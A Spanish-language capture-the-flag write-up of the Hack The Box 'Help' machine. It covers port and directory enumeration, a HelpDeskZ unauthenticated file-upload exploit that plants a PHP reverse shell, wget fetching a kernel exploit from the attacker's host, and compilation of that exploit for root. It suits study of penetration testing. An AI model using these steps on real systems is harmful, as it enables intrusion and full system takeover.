---
title: "Hack The Box - Help"
excerpt: "<img src='/images/portfolio/help/cover.webp' width='500' height=auto><br/><br/>Help is an Easy Linux box which has a GraphQL endpoint which can be enumerated get a set of credentials for a HelpDesk software. The software is vulnerable to blind SQL injection which can be exploited to get a password for SSH Login. Alternatively an unauthenticated arbitrary file upload can be exploited to get RCE. Then the kernel is found to be vulnerable and can be exploited to get a root shell."
collection: portfolio
---

NMAP
------

Utilizo la herramienta nmap para escaneo de puertos y servicios.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# nmap -A 10.10.10.121
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 17:27 CET
    Nmap scan report for 10.10.10.121
    Host is up (0.043s latency).
    Not shown: 997 closed tcp ports (reset)
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
    |   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
    |_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
    80/tcp   open  http    Apache/2.4.18 (Ubuntu)
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Did not follow redirect to http://help.htb/
    3000/tcp open  ppp?
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=1/21%OT=22%CT=1%CU=31388%PV=Y%DS=2%DC=T%G=Y%TM=65AD
    OS:462B%P=x86_64-pc-linux-gnu)SEQ()SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%
    OS:TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5
    OS:=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=
    OS:FE88)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=N)T1(R=Y
    OS:%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W
    OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
    OS:D=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)T7(R=Y%
    OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%U
    OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)

    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE (using port 21/tcp)
    HOP RTT      ADDRESS
    1   39.81 ms 10.10.14.1
    2   40.07 ms 10.10.10.121

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 55.47 seconds

HTTP
------

Al conectarme al puerto 80 mediante el navegador obtengo lo siguiente<br/><br/>
<img src='/images/portfolio/help/http.png' width='900' height=auto><br/><br/>
Intento obtener algo interesante a través de la herramienta 'gobuster'.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# gobuster dir --url http://help.htb/ --wordlist /usr/share/wordlists/dirb/common.txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://help.htb/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.hta                 (Status: 403) [Size: 287]
    /.htpasswd            (Status: 403) [Size: 292]
    /.htaccess            (Status: 403) [Size: 292]
    /index.html           (Status: 200) [Size: 11321]
    /javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]
    /server-status        (Status: 403) [Size: 296]
    /support              (Status: 301) [Size: 306] [--> http://help.htb/support/]
    Progress: 4614 / 4615 (99.98%)
    ===============================================================
    Finished
    ===============================================================

Obtengo un directorio llamado 'support' el cual procederé a analizar mediante el navegador.

HelpDeskZ
------

<img src='/images/portfolio/help/support.png' width='900' height=auto><br/><br/>
Resulta que esta dirección alberga un sistema de soporte llamado 'HelpDeskZ'. Pasándole la dirección a gobuster obtengo la siguiente salida<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# gobuster dir --url http://help.htb/support --wordlist /usr/share/wordlists/dirb/common.txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://help.htb/support
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.htpasswd            (Status: 403) [Size: 300]
    /.htaccess            (Status: 403) [Size: 300]
    /.hta                 (Status: 403) [Size: 295]
    /controllers          (Status: 301) [Size: 318] [--> http://help.htb/support/controllers/]
    /css                  (Status: 301) [Size: 310] [--> http://help.htb/support/css/]
    /favicon.ico          (Status: 200) [Size: 1150]
    /images               (Status: 301) [Size: 313] [--> http://help.htb/support/images/]
    /includes             (Status: 301) [Size: 315] [--> http://help.htb/support/includes/]
    /index.php            (Status: 200) [Size: 4413]
    /js                   (Status: 301) [Size: 309] [--> http://help.htb/support/js/]
    /uploads              (Status: 301) [Size: 314] [--> http://help.htb/support/uploads/]
    /views                (Status: 301) [Size: 312] [--> http://help.htb/support/views/]
    Progress: 4614 / 4615 (99.98%)
    ===============================================================
    Finished
    ===============================================================

Destacar el directiorio 'uploads' el cual me indica que seguramente pueda ser capaz de subir un archivo al servidor mediante este servicio.<br/><br/>
Investigando sobre HelpDeskZ, me topé con un artículo interesante (https://www.exploit-db.com/exploits/40300). Resulta que puedo subir un php reverse shell al servidor y mediante un exploit, conseguiré encontrarlo y ejecutarlo. Me descargué el exploit (40300.py) y un php reverse shell (php-reverse-shell.php).<br/><br/>
Una vez que subí el reverse shell a la dirección correspondiente (http://help.htb/support/?v=submit_ticket&action=displayForm), ejecuté un NetCat listener y arranqué el exploit<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# python2 40300.py http://help.htb/support/uploads/tickets/ php-reverse-shell.php
    Helpdeskz v1.0.2 - Unauthenticated shell upload exploit

<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# nc -lnvp 1234      
    Listening on 0.0.0.0 1234
    Connection received on 10.10.10.121 53526
    Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
    09:40:57 up  1:13,  0 users,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    help
    $ python -c "import pty;pty.spawn('/bin/bash')"
    help@help:/$ cd home
    cd home
    help@help:/home$ cd help
    cd help
    help@help:/home/help$ cat user.txt
    cat user.txt
    2a44eca41db26ec461c9820aea62f835

Ya tengo entonces el reverse shell en mi puerto 1234 como usuario 'help' y obtengo el flag de usuario.

Escalado de privilegios
------

Para tratar de conseguir escalar privilegios, enumeré cierta información sobre la maquina. En el caso de la versión del kernel, me di cuenta de que es vulnerable a un exploit de escalado de privilegios<br/>

    help@help:/home/help$ uname -r
    uname -r
    4.4.0-116-generic

<br/><br/>

<img src='/images/portfolio/help/searchsploit.png' width='900' height=auto><br/><br/>

Procedí a copiar el exploit a mi directorio de trabajo y arranqué un servidor HTTP para descargar el exploit desde el reverse shell.<br/>

    help@help:/home/help$ wget http://10.10.14.27:8000/44298.c 
    wget http://10.10.14.27:8000/44298.c                                                                                                                         
    --2024-01-21 09:51:32--  http://10.10.14.27:8000/44298.c
    Connecting to 10.10.14.27:8000... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 5773 (5.6K) [text/x-csrc]
    Saving to: '44298.c'

    44298.c             100%[===================>]   5.64K  --.-KB/s    in 0s      

    2024-01-21 09:51:32 (285 MB/s) - '44298.c' saved [5773/5773]

    help@help:/home/help$ ls
    ls
    44298.c  help  npm-debug.log  user.txt

Una vez que descargé el exploit (44298.c) en la víctima, compilé el programa y lo ejecuté obteniendo acceso root.<br/>

    help@help:/home/help$ gcc 44298.c -o 44298
    gcc 44298.c -o 44298
    help@help:/home/help$ ls
    ls
    44298  44298.c  help  npm-debug.log  user.txt
    help@help:/home/help$ ./44298
    ./44298
    task_struct = ffff88003d347000
    uidptr = ffff88003d03ac04
    spawning root shell
    root@help:/home/help# whoami
    whoami
    root

Ya teniendo acceso de superusuario solo quedaba obtener el flag en la ruta clásica '/root/root.txt'.<br/>

    root@help:/home/help# cd /root
    cd /root
    root@help:/root# cat root.txt
    cat root.txt
    c44c1c032dfeba295202199adf9c916e